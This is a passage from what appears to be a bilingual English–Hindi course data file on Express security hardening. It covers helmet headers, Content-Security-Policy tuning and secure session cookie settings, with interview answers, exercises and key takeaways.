        hi: '**Ek `__Host-sid` httpOnly + Secure + SameSite=Lax cookie mein session, 8-ghante lifetime, signed**, SPA `fetch(url, { credentials: "include" })` call karta hai — frontend kabhi token nahi dekhta.',
      },
      {
        en: '**`Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()` and `Cache-Control: no-store` on every authenticated JSON response** — a compromised script cannot reach hardware and a shared proxy never caches a user\'s account data.',
        hi: '**Har authenticated JSON response par `Permissions-Policy: camera=(), ...` aur `Cache-Control: no-store`** — ek compromised script hardware tak nahi pahunch sakta.',
      },
    ],

    interviewQA: [
      {
        q: 'What does helmet do, and which header is worth tuning by hand?',
        qHi: 'helmet kya karta hai, aur kaunsa header haath se tune karne layak hai?',
        a: 'helmet is a collection of small Express middlewares that set, or remove, HTTP response headers that harden the browser side of your app. One app.use of helmet, before your routes, gives you a restrictive Content-Security-Policy, Strict-Transport-Security set to a year, X-Content-Type-Options nosniff so the browser stops guessing content types, X-Frame-Options SAMEORIGIN against framing, a conservative Referrer-Policy, the Cross-Origin isolation headers that mitigate Spectre-class attacks, and it deletes the X-Powered-By Express fingerprint. It does not touch CORS, cookies, or rate limiting — those are separate concerns. The one header you almost always tune by hand is the Content-Security-Policy. helmet\'s default is a good starting point but it restricts scripts and connections to your own origin, and real apps load scripts from a CDN and call an API on another host, so you widen script-src and connect-src to name those exact origins. The important discipline is to avoid \'unsafe-inline\' in script-src — that switches off most of CSP\'s XSS protection — and instead use a per-response nonce for any inline scripts you cannot move to files, and to roll the policy out in Report-Only mode first so you collect violations and fix the legitimate ones before enforcing.',
        aHi: 'helmet chhote Express middlewares ka ek collection hai jo HTTP response headers set, ya remove, karte hain jo aapke app ke browser side ko harden karte hain. helmet ka ek app.use, routes se pehle, aapko ek restrictive Content-Security-Policy, ek saal ka Strict-Transport-Security, X-Content-Type-Options nosniff, X-Frame-Options SAMEORIGIN, ek conservative Referrer-Policy, Cross-Origin isolation headers deta hai, aur X-Powered-By fingerprint delete karta hai. Ye CORS, cookies, ya rate limiting nahi chhuta. Jo ek header aap lagbhag hamesha haath se tune karte ho wo Content-Security-Policy hai. Mahatvapoorna discipline script-src mein \'unsafe-inline\' se bachna hai aur iske bजाy ek per-response nonce istemal karna hai, aur policy ko pehle Report-Only mode mein roll out karna hai.',
      },
      {
        q: 'Where should a session token live in a browser app, and why not localStorage?',
        qHi: 'Ek browser app mein ek session token kahaan rehna chahiye, aur localStorage kyun nahi?',
        a: 'It should be in an httpOnly cookie, ideally with the __Host- name prefix, plus Secure and SameSite. httpOnly means the cookie is not exposed to document.cookie, so no JavaScript running on the origin can read it — and that is the whole point, because any cross-site scripting flaw anywhere on the origin, whether from a vulnerable dependency, an unescaped field, or a compromised third-party script, runs with full access to whatever the page can read. A token in localStorage, or in a cookie without httpOnly, is exactly that: readable by any script, so a single XSS exfiltrates it in one line and the stolen token stays valid until expiry. An httpOnly cookie removes that entire class of theft. The cost is that cookies are attached automatically to requests, which reintroduces CSRF, but CSRF is a solved problem — SameSite set to Lax stops the cookie riding along on cross-site POSTs and fetches, and for state-changing endpoints you add a CSRF token or a strict origin check. The __Host- prefix makes the browser enforce that the cookie is Secure, path is slash, and has no Domain attribute, so it is locked to the exact host and a compromised subdomain cannot set or overwrite it. Keep the lifetime short, hours not weeks, and refresh on activity.',
        aHi: 'Ye ek httpOnly cookie mein hona chahiye, aदर्श roop se __Host- name prefix ke saath, plus Secure aur SameSite. httpOnly ka matlab cookie document.cookie ko exposed nahi hai, to origin par chalne waali koi JavaScript ise padh nahi sakti — aur wahi poora point hai, kyunki origin par kahin bhi koi cross-site scripting flaw poore access ke saath chalti hai. localStorage mein ya bina httpOnly ki cookie mein ek token theek wahi hai: koi bhi script padh sakti hai, to ek single XSS ise ek line mein exfiltrate karta hai. Ek httpOnly cookie us poori theft class ko hataata hai. Cost ye hai ki cookies automatically requests se attach hoti hain, jo CSRF wapas laata hai, par CSRF ek solved problem hai — SameSite Lax plus state-changing endpoints par ek CSRF token. __Host- prefix browser ko enforce karvaata hai ki cookie Secure hai, path slash hai, aur koi Domain attribute nahi.',
      },
    ],

    exercises: [
      {
        task: 'Set up an Express app with `helmet()`, then override the CSP: `default-src \'self\'`, `script-src \'self\' https://cdn.jsdelivr.net`, `connect-src \'self\' https://api.myapp.com`, `frame-ancestors \'none\'`, `object-src \'none\'`. Add a `/csp-report` POST endpoint and configure `Content-Security-Policy-Report-Only` first. Verify with `curl -sI` that the header is present and is the Report-Only variant.',
        taskHi: 'Ek Express app `helmet()` ke saath set karo, phir CSP override karo. Ek `/csp-report` POST endpoint add karo aur pehle `Content-Security-Policy-Report-Only` configure karo. `curl -sI` se verify karo.',
        hint: 'helmet CSP option `reportOnly: true` emits the `-Report-Only` header. Add `reportUri: ["/csp-report"]` (or the newer `report-to`) to the directives. The `/csp-report` handler just logs `req.body` and returns 204.',
        hintHi: 'helmet CSP option `reportOnly: true` `-Report-Only` header emit karta hai. Directives mein `reportUri: ["/csp-report"]` add karo. Handler `req.body` log karta hai aur 204 return karta hai.',
      },
      {
        task: 'Write a `setSession(res, sessionId)` helper and a `clearSession(res)` helper. `setSession` must use `__Host-sid`, `httpOnly`, `secure`, `sameSite: "lax"`, `path: "/"`, an 8-hour `maxAge`, and `signed: true`. `clearSession` must clear it with the SAME attributes (name, path) or the browser keeps the cookie. Write a comment listing the three things the `__Host-` prefix forces the browser to check.',
        taskHi: 'Ek `setSession(res, sessionId)` aur `clearSession(res)` helper likho. `setSession` ko `__Host-sid`, `httpOnly`, `secure`, `sameSite: "lax"`, `path: "/"`, 8-ghante `maxAge`, `signed: true` istemal karna chahiye. Ek comment: teen cheezein jo `__Host-` prefix browser ko check karvaata hai.',
        hint: '`res.clearCookie("__Host-sid", { path: "/", secure: true, httpOnly: true, sameSite: "lax" })` — clearCookie must match name+path (and Secure) or the delete is ignored. The three __Host- checks: has `Secure`, has `Path=/`, has NO `Domain` attribute.',
        hintHi: '`res.clearCookie("__Host-sid", { path: "/", secure: true, ... })` — clearCookie ko name+path match karna chahiye. Teen __Host- checks: `Secure` hai, `Path=/` hai, KOI `Domain` attribute nahi.',
      },
      {
        task: 'Build a tiny test (with `supertest`) that hits a hardened route and asserts: `x-powered-by` is absent, `x-content-type-options` is `nosniff`, `content-security-policy` contains `frame-ancestors \'none\'`, and a `Set-Cookie` for the session contains `HttpOnly`, `Secure`, and `SameSite=Lax`. This is the regression guard that catches someone removing `helmet()` or loosening a cookie flag.',
        taskHi: 'Ek chhota test (`supertest` ke saath) banao jo ek hardened route hit karta hai aur assert karta hai: `x-powered-by` absent hai, `x-content-type-options` `nosniff` hai, CSP mein `frame-ancestors \'none\'` hai, aur session ke `Set-Cookie` mein `HttpOnly`, `Secure`, `SameSite=Lax` hain.',
        hint: '`const res = await request(app).get("/dashboard");` then `expect(res.headers["x-powered-by"]).toBeUndefined()`, `expect(res.headers["content-security-policy"]).toContain("frame-ancestors \'none\'")`, and search `res.headers["set-cookie"][0]` for the flag substrings.',
        hintHi: '`const res = await request(app).get("/dashboard");` phir `expect(res.headers["x-powered-by"]).toBeUndefined()`, aur `res.headers["set-cookie"][0]` mein flag substrings search karo.',
      },
    ],

    keyTakeaways: [
      'Security headers are DEFENCE IN DEPTH — they make the BROWSER enforce a second layer; they do NOT replace auth / authorization / input validation. Nearly free to add; every breach post-mortem lists the missing ones.',
      '`app.use(helmet())` FIRST (before routes) sets ~13 headers: a restrictive `Content-Security-Policy`, `Strict-Transport-Security` (1 yr), `X-Content-Type-Options: nosniff`, `X-Frame-Options: SAMEORIGIN`, `Referrer-Policy: no-referrer`, the `Cross-Origin-*` isolation headers — and REMOVES `X-Powered-By: Express`. It does NOT do CORS, cookies, or rate limiting.',
      'CSP is THE header to tune by hand: `script-src`/`connect-src`/`img-src` for your CDN + API. `\'self\'` = the page\'s exact origin. NO source list allows inline code — `<script>...</script>` / `onclick=` are blocked unless you add `\'unsafe-inline\'` (defeats most of CSP — DON\'T) or use a per-response NONCE. `connect-src` governs `fetch`/XHR/WebSocket/`sendBeacon` — it blocks EXFILTRATION even if a script runs. `frame-ancestors \'none\'` = the real clickjacking defense. Roll out via `Content-Security-Policy-Report-Only` + a report endpoint first.',
      'Other headers: `Strict-Transport-Security` (only after EVERY subdomain is HTTPS — `includeSubDomains` + a 1-yr `max-age` is hard to undo, browsers cache it; ramp up), `Permissions-Policy` (disable camera/mic/geolocation you never use), `Cache-Control: no-store` on authenticated JSON.',
      'SESSION COOKIE FLAGS: `httpOnly: true` = not in `document.cookie` -> an XSS payload CANNOT steal the session (THE most important flag; a `localStorage` token has NO equivalent — any XSS reads it in one line). `secure: true` = HTTPS only. `sameSite`: `"lax"` (good default + CSRF mitigation), `"strict"` (admin panels), `"none"` (needs `secure`, genuine cross-site only).',
      'Also: scope `path`/omit `domain` (host-locked), short `maxAge` (hours not weeks) + refresh on activity, `signed: true` (HMAC — tamper-evident, NOT encryption — value still readable).',
      '`__Host-` NAME PREFIX = the browser REFUSES to store the cookie unless it has `Secure` + `Path=/` + NO `Domain` attribute -> guaranteed host-locked + HTTPS-only, and a compromised subdomain can\'t set/overwrite it (session fixation defense). A mis-scoped cookie fails VISIBLY ("login broken") instead of shipping quietly. `__Secure-` is the weaker variant.',
      'For a browser app: session in a `__Host-sid` httpOnly+Secure+SameSite=Lax signed cookie, short lifetime; the SPA uses `fetch(url, { credentials: "include" })` and NEVER stores a token; add a CSRF token / origin check on state-changing routes.',
    ],
    keyTakeawaysHi: [
      'Security headers DEFENCE IN DEPTH hain — wo BROWSER ko ek doosri layer enforce karvaate hain; wo auth / authorization / input validation ko replace NAHI karte.',
      '`app.use(helmet())` PEHLE (routes se pehle) ~13 headers set karta hai: ek restrictive `Content-Security-Policy`, `Strict-Transport-Security`, `X-Content-Type-Options: nosniff`, `X-Frame-Options`, `Referrer-Policy` — aur `X-Powered-By: Express` HATATA hai. Ye CORS, cookies, rate limiting NAHI karta.',
      'CSP THE header hai jo haath se tune karo. `\'self\'` = page ka exact origin. KOI source list inline code allow nahi karti — `\'unsafe-inline\'` mat add karo, ek per-response NONCE istemal karo. `connect-src` `fetch`/XHR/`sendBeacon` govern karta hai — ye EXFILTRATION block karta hai. `frame-ancestors \'none\'` = asli clickjacking defense. Pehle `Report-Only` mode.',
      'Doosre headers: `Strict-Transport-Security` (sirf jab HAR subdomain HTTPS ho; ramp up), `Permissions-Policy`, authenticated JSON par `Cache-Control: no-store`.',
      'SESSION COOKIE FLAGS: `httpOnly: true` = `document.cookie` mein nahi -> ek XSS payload session chura NAHI sakta (THE sabse mahatvapoorna flag; ek `localStorage` token ka KOI samतुल्य nahi). `secure: true` = HTTPS only. `sameSite`: `"lax"` (achha default + CSRF mitigation).',
      'Aur: `path` scope karo/`domain` omit karo, chhota `maxAge`, `signed: true` (HMAC — tamper-evident, encryption NAHI).',
      '`__Host-` NAME PREFIX = browser cookie store karne se MANA karta hai jab tak `Secure` + `Path=/` + KOI `Domain` attribute nahi ho -> guaranteed host-locked + HTTPS-only. Ek mis-scoped cookie VISIBLY fail hota hai.',
      'Ek browser app ke liye: session ek `__Host-sid` httpOnly+Secure+SameSite=Lax signed cookie mein; SPA `fetch(url, { credentials: "include" })` istemal karta hai aur KABHI token store nahi karta.',
    ],
  },
];
